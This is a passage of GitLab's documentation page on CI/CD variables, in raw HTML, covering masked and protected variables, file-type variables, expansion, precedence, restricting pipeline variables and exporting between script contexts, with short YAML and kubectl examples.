in the <strong>CI/CD</strong> settings page. Hiding a variable is only possible when creating a new variable,
you cannot update an existing variable to be hidden.</p><p>Prerequisites:</p><ul><li>You must have the same role or access level as required to <a href=/ci/variables/#define-a-cicd-variable-in-the-ui>add a CI/CD variable in the UI</a>.</li><li>The variable value must match the <a href=/ci/variables/#mask-a-cicd-variable>requirements for masked variables</a>.</li></ul><p>To hide a variable, select <strong>Masked and hidden</strong> in the <strong>Visibility</strong> section when
you <a href=/ci/variables/#define-a-cicd-variable-in-the-ui>add a new CI/CD variable in the UI</a>.
After you save the variable, the variable can be used in CI/CD pipelines, but cannot
be revealed in the UI again.</p><h3 id=protect-a-cicd-variable>Protect a CI/CD variable</h3><p>You can configure a project, group, or instance CI/CD variable to be available
only to pipelines that run on <a href=/user/project/repository/branches/protected/>protected branches</a>
or <a href=/user/project/protected_tags/>protected tags</a>.</p><p>Merged results pipelines and merge request pipelines can <a href=/ci/pipelines/merge_request_pipelines/#control-access-to-protected-variables-and-runners>optionally access protected variables</a>.</p><p>Prerequisites:</p><ul><li>You must have the same role or access level as required to <a href=/ci/variables/#define-a-cicd-variable-in-the-ui>add a CI/CD variable in the UI</a>.</li></ul><p>To set a variable as protected:</p><ol><li>For the project or group, go to <strong>Settings</strong> > <strong>CI/CD</strong>.</li><li>Expand <strong>Variables</strong>.</li><li>Next to the variable you want to protect, select <strong>Edit</strong>.</li><li>Select the <strong>Protect variable</strong> checkbox.</li><li>Select <strong>Update variable</strong>.</li></ol><p>The variable is available for all subsequent pipelines.</p><h3 id=use-file-type-cicd-variables>Use file type CI/CD variables</h3><p>All predefined CI/CD variables and variables defined in the <code>.gitlab-ci.yml</code> file
are &ldquo;variable&rdquo; type (<a href=/api/project_level_variables/><code>"variable_type": "env_var"</code> in the API</a>).</p><p>Variable type variables:</p><ul><li>Consist of a key and value pair.</li><li>Are made available in jobs as environment variables, with:<ul><li>The CI/CD variable key as the environment variable name.</li><li>The CI/CD variable value as the environment variable value.</li></ul></li></ul><p>Project, group, and instance CI/CD variables are &ldquo;variable&rdquo; type by default, but can
optionally be set as a &ldquo;file&rdquo; type (<code>"variable_type": "file"</code> in the API).
File type variables:</p><ul><li>Consist of a key, value, and file.</li><li>Are made available in jobs as environment variables, with:<ul><li>The CI/CD variable key as the environment variable name.</li><li>The CI/CD variable value saved to a temporary file.</li><li>The path to the temporary file as the environment variable value.</li></ul></li></ul><p>Use file type CI/CD variables for tools that need a file as input.</p><p>For example, the AWS CLI and <code>kubectl</code> are both tools that use <code>File</code> type variables for configuration.
If you are using <code>kubectl</code> with:</p><ul><li>A variable with a key of <code>KUBE_URL</code> and <code>https://example.com</code> as the value.</li><li>A file type variable with a key of <code>KUBE_CA_PEM</code> and a certificate as the value.</li></ul><p>Pass <code>KUBE_URL</code> as a <code>--server</code> option, which accepts a variable, and pass <code>$KUBE_CA_PEM</code>
as a <code>--certificate-authority</code> option, which accepts a path to a file:</p><div class=codeblock-wrapper><div data-vue-app=codeblock-toolbar data-code-language=shell class=codeblock-toolbar></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>kubectl config set-cluster e2e --server<span class=o>=</span><span class=s2>&#34;</span><span class=nv>$KUBE_URL</span><span class=s2>&#34;</span> --certificate-authority<span class=o>=</span><span class=s2>&#34;</span><span class=nv>$KUBE_CA_PEM</span><span class=s2>&#34;</span></span></span></code></pre></div></div><h4 id=use-a-gitlab-ciyml-variable-as-a-file-type-variable>Use a <code>.gitlab-ci.yml</code> variable as a file type variable</h4><p>You cannot set a CI/CD variable <a href=/ci/variables/#define-a-cicd-variable-in-the-gitlab-ciyml-file>defined in the <code>.gitlab-ci.yml</code> file</a>
as a file type variable. If you have a tool that requires a file path as an input,
but you want to use a variable defined in the <code>.gitlab-ci.yml</code>:</p><ul><li>Run a command that saves the value of the variable in a file.</li><li>Use that file with your tool.</li></ul><p>For example:</p><div class=codeblock-wrapper><div data-vue-app=codeblock-toolbar data-code-language=yaml class=codeblock-toolbar></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=line><span class=cl><span class=nt>variables</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>SITE_URL</span><span class=p>:</span><span class=w> </span><span class=s2>&#34;https://gitlab.example.com&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>job</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>script</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>- <span class=l>echo &#34;$SITE_URL&#34; &gt; &#34;site-url.txt&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>- <span class=l>mytool --url-file=&#34;site-url.txt&#34;</span></span></span></code></pre></div></div><h2 id=allow-cicd-variable-expansion>Allow CI/CD variable expansion</h2><div class="collapsible-section gl-my-5"><button class="gl-align-middle gl-text-left gl-border-0 gl-pl-0" type=button aria-expanded=false aria-controls=collapsible-6 aria-label="Toggle section" data-toggle=collapse data-target=#collapsible-6>History<span class="gl-ml-2 icon"></span></button><div id=collapsible-6 class="collapsible-list collapse" aria-hidden=true><ul><li><strong>Expand variable</strong> option <a href=https://gitlab.com/gitlab-org/gitlab/-/issues/410414>renamed</a> to <strong>Expand variable reference</strong> in GitLab 16.3.</li><li><a href=https://gitlab.com/gitlab-org/gitlab/-/merge_requests/209144>Changed</a> to disabled by default in GitLab 18.6.</li></ul></div></div><p>You can set a variable to treat values with the <code>$</code> character as a reference to another variable.
When the pipeline runs, the reference expands to use the value of the referenced variable.</p><p>CI/CD variables defined in the UI are not expanded by default. For CI/CD variables defined in
the <code>.gitlab-ci.yml</code> file, control variable expansion with the <a href=/ci/yaml/#variablesexpand><code>variables:expand</code> keyword</a>.</p><p>Prerequisites:</p><ul><li>You must have the same role or access level as required to <a href=/ci/variables/#define-a-cicd-variable-in-the-ui>add a CI/CD variable in the UI</a>.</li></ul><p>To enable variable expansion for the variable:</p><ol><li>For the project or group, go to <strong>Settings</strong> > <strong>CI/CD</strong>.</li><li>Expand <strong>Variables</strong>.</li><li>Next to the variable you want to do not want expanded, select <strong>Edit</strong>.</li><li>Select the <strong>Expand variable reference</strong> checkbox.</li><li>Select <strong>Update variable</strong>.</li></ol><div class="alert alert-type-note gl-rounded-lg"><div class=alert-icon></div><div class=gl-min-w-0><p>Do not <a href=/ci/variables/#mask-a-cicd-variable>mask</a> a variable value if you want to use variable expansion.
If both masking and variable expansion are combined, character limitations prevent
the use of the <code>$</code> to reference other variables.</p></div></div><h2 id=cicd-variable-precedence>CI/CD variable precedence</h2><div class="collapsible-section gl-my-5"><button class="gl-align-middle gl-text-left gl-border-0 gl-pl-0" type=button aria-expanded=false aria-controls=collapsible-8 aria-label="Toggle section" data-toggle=collapse data-target=#collapsible-8>History<span class="gl-ml-2 icon"></span></button><div id=collapsible-8 class="collapsible-list collapse" aria-hidden=true><ul><li>Scan Execution Policies variable precedence was <a href=https://gitlab.com/gitlab-org/gitlab/-/issues/424028>changed</a> in GitLab 16.7 <a href=/administration/feature_flags/>with a flag</a> named <code>security_policies_variables_precedence</code>. Enabled by default. <a href=https://gitlab.com/gitlab-org/gitlab/-/issues/435727>Feature flag removed in GitLab 16.8</a>.</li></ul></div></div><p>You can use CI/CD variables with the same name in different places, but the values
can overwrite each other. The type of variable and where they are defined determines
which variables take precedence.</p><p>The order of precedence for variables is (from highest to lowest):</p><ol><li><a href=/user/application_security/policies/pipeline_execution_policies/#cicd-variables>Pipeline execution policy variables</a>.</li><li><a href=/user/application_security/policies/scan_execution_policies/>Scan execution policy variables</a>.</li><li><a href=/ci/variables/#use-pipeline-variables>Pipeline variables</a>. These variables all have the same precedence:<ul><li>Variables passed to downstream pipelines.</li><li>Trigger variables.</li><li>Scheduled pipeline variables.</li><li>Manual pipeline variables.</li><li>Variables added when creating a pipeline with the API.</li><li>Manual job variables.</li></ul></li><li>Project variables.</li><li>Group variables. If the same variable name exists in a group and its subgroups,
the job uses the value from the closest subgroup. For example, if you have
<code>Group > Subgroup 1 > Subgroup 2 > Project</code>, the variable defined in <code>Subgroup 2</code> takes precedence.</li><li>Instance variables.</li><li><a href=/ci/variables/job_scripts/#pass-an-environment-variable-to-another-job>Variables from <code>dotenv</code> reports</a>.</li><li>Job variables, defined in jobs in the <code>.gitlab-ci.yml</code> file.</li><li>Default variables for all jobs, defined at the top-level of the <code>.gitlab-ci.yml</code> file.</li><li><a href=/ci/variables/predefined_variables/#deployment-variables>Deployment variables</a>.</li><li><a href=/ci/variables/predefined_variables/>Predefined variables</a>.</li></ol><p>For example:</p><div class=codeblock-wrapper><div data-vue-app=codeblock-toolbar data-code-language=yaml class=codeblock-toolbar></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=line><span class=cl><span class=nt>variables</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>API_TOKEN</span><span class=p>:</span><span class=w> </span><span class=s2>&#34;default&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>job1</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>variables</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>API_TOKEN</span><span class=p>:</span><span class=w> </span><span class=s2>&#34;secure&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nt>script</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>- <span class=l>echo &#34;The variable is &#39;$API_TOKEN&#39;&#34;</span></span></span></code></pre></div></div><p>In this example, <code>job1</code> outputs <code>The variable is 'secure'</code> because variables defined in jobs in the <code>.gitlab-ci.yml</code> file
have higher precedence than default variables.</p><h2 id=use-pipeline-variables>Use pipeline variables</h2><p>Pipeline variables are variables that are specified when running a new pipeline.</p><div class="alert alert-type-note gl-rounded-lg"><div class=alert-icon></div><div class=gl-min-w-0><p>In <a href=/update/deprecations/#increased-default-security-for-use-of-pipeline-variables>GitLab 17.7</a>
and later, <a href=/ci/inputs/#for-a-pipeline>pipeline inputs</a> are recommended over passing pipeline variables.
For enhanced security, you should <a href=/ci/variables/#restrict-pipeline-variables>disable pipeline variables</a> when using inputs.</p></div></div><p>Prerequisites:</p><ul><li>You must have the Developer role in the project.</li></ul><p>You can specify a pipeline variable when you:</p><ul><li><a href=/ci/jobs/job_control/#specify-variables-when-running-manual-jobs>Run a pipeline manually</a> in the UI.</li><li>Create a <a href=/ci/pipelines/schedules/#create-a-pipeline-schedule>scheduled pipeline</a>.</li><li>Create a pipeline by using <a href=/api/pipelines/#create-a-new-pipeline>the <code>pipelines</code> API endpoint</a>.</li><li>Create a pipeline by using <a href=/ci/triggers/#pass-cicd-variables-in-the-api-call>the <code>triggers</code> API endpoint</a>.</li><li>Use <a href=/topics/git/commit/#push-options-for-gitlab-cicd>push options</a>.</li><li>Pass variables to a downstream pipeline by using either the <a href=/ci/pipelines/downstream_pipelines/#pass-cicd-variables-to-a-downstream-pipeline><code>variables</code> keyword</a>,
<a href=/ci/yaml/#triggerforward><code>trigger:forward</code> keyword</a> or <a href=/ci/pipelines/downstream_pipelines/#pass-dotenv-variables-created-in-a-job><code>dotenv</code> variables</a>.</li></ul><p>These variables have higher precedence and can override other defined variables,
including predefined variables.</p><div class="alert alert-type-warning gl-rounded-lg"><div class=alert-icon></div><div class=gl-min-w-0><p>You should avoid overriding predefined variables in most cases, as it can cause the pipeline to behave unexpectedly.</p></div></div><h3 id=restrict-pipeline-variables>Restrict pipeline variables</h3><div class="collapsible-section gl-my-5"><button class="gl-align-middle gl-text-left gl-border-0 gl-pl-0" type=button aria-expanded=false aria-controls=collapsible-11 aria-label="Toggle section" data-toggle=collapse data-target=#collapsible-11>History<span class="gl-ml-2 icon"></span></button><div id=collapsible-11 class="collapsible-list collapse" aria-hidden=true><ul><li><a href=https://gitlab.com/gitlab-org/gitlab/-/issues/440338>Introduced</a> in GitLab 17.1.</li><li>For GitLab.com, setting defaults <a href=https://gitlab.com/gitlab-org/gitlab/-/issues/502382>updated for all new projects in new namespaces</a>
to <code>no_one_allowed</code> for <code>ci_pipeline_variables_minimum_override_role</code> in GitLab 17.7.</li></ul></div></div><p>You can limit who can run pipelines with pipeline variables to specific user roles.
When users with a lower role try to use pipeline variables, they receive an
<code>Insufficient permissions to set pipeline variables</code> error message.</p><p>Prerequisites:</p><ul><li>You must have the Maintainer role in the project. If the minimum role was previously set to <code>owner</code>
or <code>no_one_allowed</code>, then you must have the Owner role in the project.</li></ul><p>To limit the use of pipeline variables to only the Maintainer role and higher:</p><ul><li>Go to <strong>Settings > CI/CD > Variables</strong>.</li><li>Under <strong>Minimum role to use pipeline variables</strong>, select one of:<ul><li><code>no_one_allowed</code>: No pipelines can run with pipeline variables.
Default for new projects in new namespaces on GitLab.com.</li><li><code>owner</code>: Only users with the Owner role can run pipelines with pipeline variables.
You must have the Owner role for the project to change the setting to this value.</li><li><code>maintainer</code>: Only users with at least the Maintainer role can run pipelines with pipeline variables.
Default when not specified on GitLab Self-Managed and GitLab Dedicated.</li><li><code>developer</code>: Only users with at least the Developer role can run pipelines with pipeline variables.</li></ul></li></ul><p>You can also use <a href=/api/projects/#edit-a-project>the projects API</a> to set
the role for the <code>ci_pipeline_variables_minimum_override_role</code> setting.</p><p>This restriction does not affect the use of CI/CD variables from the project or group settings.
Most jobs can still use the <code>variables</code> keyword in the YAML configuration, but not
jobs that use the <code>trigger</code> keyword to trigger downstream pipelines. Trigger jobs
pass variables to a downstream pipelines as pipeline variables, which is also controlled
by this setting.</p><h4 id=enable-pipeline-variable-restriction-for-multiple-projects>Enable pipeline variable restriction for multiple projects</h4><div class="collapsible-section gl-my-5"><button class="gl-align-middle gl-text-left gl-border-0 gl-pl-0" type=button aria-expanded=false aria-controls=collapsible-12 aria-label="Toggle section" data-toggle=collapse data-target=#collapsible-12>History<span class="gl-ml-2 icon"></span></button><div id=collapsible-12 class="collapsible-list collapse" aria-hidden=true><ul><li><a href=https://gitlab.com/gitlab-org/gitlab/-/issues/514242>Introduced</a> in GitLab 18.4.</li></ul></div></div><p>For groups with many projects, you can disable pipeline variables
in all projects that don&rsquo;t currently use them. This option sets the
<strong>Minimum role to use pipeline variables</strong> setting to <code>no_one_allowed</code> for projects
that have never used pipeline variables.</p><p>Prerequisites:</p><ul><li>You must have the Owner role for the group.</li></ul><p>To enable the pipeline variable restriction setting in projects in the group:</p><ol><li>On the left sidebar, select <strong>Search or go to</strong> and find your group. If you&rsquo;ve <a href=/user/interface_redesign/#turn-new-navigation-on-or-off>turned on the new navigation</a>, this field is on the top bar.</li><li>Select <strong>Settings</strong> > <strong>CI/CD</strong>.</li><li>Expand <strong>Variables</strong>.</li><li>In the <strong>Disable pipeline variables in projects that don&rsquo;t use them</strong> section,
select <strong>Start migration</strong>.</li></ol><p>The migration runs in the background. You receive an email notification
when the migration is complete. Project maintainers can later change the setting
for their individual projects if needed.</p><h2 id=exporting-variables>Exporting variables</h2><p>Scripts executed in separate shell contexts do not share exports, aliases,
local function definitions, or any other local shell updates.</p><p>This means that if a job fails, variables created by user-defined scripts are not
exported.</p><p>When runners execute jobs defined in <code>.gitlab-ci.yml</code>:</p><ul><li>Scripts specified in <code>before_script</code> and the main script are executed together in
a single shell context, and are concatenated.</li><li>Scripts specified in <code>after_script</code> run in a shell context completely separate to
the <code>before_script</code> and the specified scripts.</li></ul><p>Regardless of the shell the scripts are executed in, the runner output includes:</p><ul><li>Predefined variables.</li><li>Variables defined in:<ul><li>Instance, group, or project CI/CD settings.</li><li>The <code>.gitlab-ci.yml</code> file in the <code>variables:</code> section.</li><li>The <code>.gitlab-ci.yml</code> file in the <code>secrets:</code> section.</li><li>The <code>config.toml</code>.</li></ul></li></ul><p>The runner cannot handle manual exports, shell aliases, and functions executed in the body of the script, like <code>export MY_VARIABLE=1</code>.</p><p>For example, in the following <code>.gitlab-ci.yml</code> file, the following scripts are defined:</p><div class=codeblock-wrapper><div data-vue-app=codeblock-toolbar data-code-language=yaml class=codeblock-toolbar></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=line><span class=cl><span class=nt>job</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w> </span><span class=nt>variables</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   </span><span class=nt>JOB_DEFINED_VARIABLE</span><span class=p>:</span><span class=w> </span><span class=s2>&#34;job variable&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w> </span><span class=nt>before_script</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   </span>- <span class=l>echo &#34;This is the &#39;before_script&#39; script&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   </span>- <span class=l>export MY_VARIABLE=&#34;variable&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w> </span><span class=nt>script</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   </span>- <span class=l>echo &#34;This is the &#39;script&#39; script&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   </span>- <span class=l>echo &#34;JOB_DEFINED_VARIABLE&#39;s value is ${JOB_DEFINED_VARIABLE}&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   </span>- <span class=l>echo &#34;CI_COMMIT_SHA&#39;s value is ${CI_COMMIT_SHA}&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   </span>- <span class=l>echo &#34;MY_VARIABLE&#39;s value is ${MY_VARIABLE}&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w> </span><span class=nt>after_script</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   </span>- <span class=l>echo &#34;JOB_DEFINED_VARIABLE&#39;s value is ${JOB_DEFINED_VARIABLE}&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   </span>- <span class=l>echo &#34;CI_COMMIT_SHA&#39;s value is ${CI_COMMIT_SHA}&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   </span>- <span class=l>echo &#34;MY_VARIABLE&#39;s value is ${MY_VARIABLE}&#34;</span></span></span></code></pre></div></div><p>When the runner executes the job:</p><ol><li><code>before_script</code> is executed:<ol><li>Prints to the output.</li><li>Defines the variable for <code>MY_VARIABLE</code>.</li></ol></li><li><code>script</code> is executed:<ol><li>Prints to the output.</li><li>Prints the value of <code>JOB_DEFINED_VARIABLE</code>.</li><li>Prints the value of <code>CI_COMMIT_SHA</code>.</li><li>Prints the value of <code>MY_VARIABLE</code>.</li></ol></li><li><code>after_script</code> is executed in a new, separate shell context:<ol><li>Prints to the output.</li><li>Prints the value of <code>JOB_DEFINED_VARIABLE</code>.</li><li>Prints the value of <code>CI_COMMIT_SHA</code>.</li><li>Prints an empty value of <code>MY_VARIABLE</code>. The variable value cannot be detected because <code>after_script</code> is in a separate shell context to <code>before_script</code>.</li></ol></li></ol><h2 id=related-topics>Related topics</h2><ul><li><p>You can configure <a href=/topics/autodevops/>Auto DevOps</a> to pass CI/CD variables
to a running application. To make a CI/CD variable available as an environment variable in the running application&rsquo;s container,
<a href=/topics/autodevops/cicd_variables/#configure-application-secret-variables>prefix the variable key</a>
with <code>K8S_SECRET_</code>.</p></li><li><p>The <a href="https://www.youtube.com/watch?v=v4ZOJ96hAck">Managing the Complex Configuration Data Management Monster Using GitLab</a>
video is a walkthrough of the <a href=https://gitlab.com/guided-explorations/config-data-top-scope/config-data-subscope/config-data-monorepo>Complex Configuration Data Monorepo</a>
working example project. It explains how multiple levels of group CI/CD variables
can be combined with environment-scoped project variables for complex configuration
of application builds or deployments.</p><p>The example can be copied to your own group or instance for testing. More details
on what other GitLab CI patterns are demonstrated are available at the project page.</p></li><li><p>You can <a href=/ci/pipelines/downstream_pipelines/#pass-cicd-variables-to-a-downstream-pipeline>pass CI/CD variables to downstream pipelines</a>.
Use <a href=/ci/yaml/#triggerforward><code>trigger:forward</code> keyword</a> to specify what type of variables
to pass to the downstream pipeline.</p></li></ul></div><div data-vue-app=back-to-top-button></div></div><div class="feedback gl-min-h-8" data-ga-section=feedback data-elastic-exclude><div data-component=docs-feedback></div></div></div><aside class=sidebar-right><div data-ga-section=toc data-vue-app=toc></div></aside></div></main><footer data-ga-section=footer><section data-ga-section=footer><div id=footer class="footer-section container gl-grid gl-grid-cols-2 gl-grid-rows-3 gl-grid-rows-auto gl-gap-8 lg:gl-grid-cols-5 lg:gl-grid-rows-1 lg:gl-justify-items-center gl-px-8 gl-py-8 lg:gl-py-10"><div class="gl-col-span-2 lg:gl-col-span-1 gl-row-start-1"><div class="docs-title gl-flex gl-items-center"><a href=/><img src=/gitlab-logo-footer.svg alt="GitLab Docs logo" class=logo width=176 height=24></a></div><ul class="docs-social gl-list-none gl-flex"><li><a href=https://www.facebook.com/gitlab class=facebook><span class=gl-sr-only>Facebook</span></a></li><li><a href=https://www.linkedin.com/company/gitlab-com class=linkedin><span class=gl-sr-only>LinkedIn</span></a></li><li><a href=https://twitter.com/gitlab class=twitter><span class=gl-sr-only>Twitter</span></a></li><li><a href=https://www.youtube.com/channel/UCnMGQ8QHMAnVIsI3xJrihhg class=youtube><span class=gl-sr-only>YouTube</span></a></li></ul><a href=https://creativecommons.org/licenses/by-sa/4.0/ target=_blank rel="license noopener noreferrer" class=gl-mt-0><img src=/by-sa.svg alt="Creative Commons License" width=80 height=15></a></div><div class="gl-col-span-1 gl-row-start-2 lg:gl-row-start-1"><div class="footer-section-title gl-heading-3">Company</div><ul class="gl-list-none gl-p-0"><li><a href=https://about.gitlab.com/company/>About GitLab</a></li><li><a href=https://about.gitlab.com/pricing/>View pricing</a></li><li><a href=https://about.gitlab.com/free-trial/>Try GitLab for free</a></li></ul></div><div class="gl-col-span-1 gl-row-start-2 lg:gl-row-start-1"><div class="footer-section-title gl-heading-3">Feedback</div><ul class="gl-list-none gl-p-0"><li><a href=https://gitlab.com/gitlab-org/gitlab/-/blob/master/doc/ci/variables/_index.md>View page source</a></li><li><a href=https://gitlab.com/-/ide/project/gitlab-org/gitlab/edit/master/-/doc/ci/variables/_index.md>Edit in web IDE</a></li><li><a href=https://about.gitlab.com/community/contribute/>Contribute to GitLab</a></li><li><a href="https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Documentation">Suggest updates</a></li></ul></div><div class="gl-col-span-1 gl-row-start-3 lg:gl-row-start-1"><div class="footer-section-title gl-heading-3">Help & Community</div><ul class="gl-list-none gl-p-0"><li><a href=https://university.gitlab.com/pages/certifications>Get certified</a></li><li><a href=https://about.gitlab.com/support/>Get support</a></li><li><a href="https://forum.gitlab.com/new-topic?title=topic%20title&amp;body=topic%20body&amp;tags=docs-feedback">Post on the GitLab forum</a></li></ul></div><div class="gl-col-span-1 gl-row-start-3 lg:gl-row-start-1"><div class="footer-section-title gl-heading-3">Resources</div><ul class="gl-list-none gl-p-0"><li><a href=https://about.gitlab.com/terms/>Terms</a></li><li><a href=https://about.gitlab.com/privacy/>Privacy statement</a></li><li><a href=/legal/use_generative_ai/>Use of generative AI</a></li><li><a href=/legal/licensing_policy/>Acceptable use of user licenses</a></li><li><button id=ot-sdk-btn class=ot-sdk-show-settings></button></li></ul></div></div></section></footer><script type=module src=/vite/main.js></script><script async>(function(e,t,n,s,o){e[s]=e[s]||[],e[s].push({"gtm.start":(new Date).getTime(),event:"gtm.js"});var a=t.getElementsByTagName(n)[0],i=t.createElement(n),r=s!="dataLayer"?"&l="+s:"";i.async=!0,i.src="https://www.googletagmanager.com/gtm.js?id="+o+r,a.parentNode.insertBefore(i,a)})(window,document,"script","dataLayer","GTM-NJXWQL")</script><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-NJXWQL" height=0 width=0 style=display:none;visibility:hidden></iframe></noscript><script async>(function(){var e,t=!1;function n(){t===!1&&(t=!0,Munchkin.init("194-VVC-221",{useBeaconAPI:!0}))}e=document.createElement("script"),e.type="text/javascript",e.async=!0,e.src="https://munchkin.marketo.net/munchkin.js",e.onreadystatechange=function(){(this.readyState=="complete"||this.readyState=="loaded")&&n()},e.onload=n,document.getElementsByTagName("head")[0].appendChild(e)})()</script><script async src=https://cdn.bizible.com/scripts/bizible.js></script><script async>_linkedin_partner_id="30694",window._linkedin_data_partner_ids=window._linkedin_data_partner_ids||[],window._linkedin_data_partner_ids.push(_linkedin_partner_id),function(){var t=document.getElementsByTagName("script")[0],e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="https://snap.licdn.com/li.lms-analytics/insight.min.js",t.parentNode.insertBefore(e,t)}()</script><noscript><img height=1 width=1 style=display:none alt src="https://dc.ads.linkedin.com/collect/?pid=30694&fmt=gif"></noscript></body></html>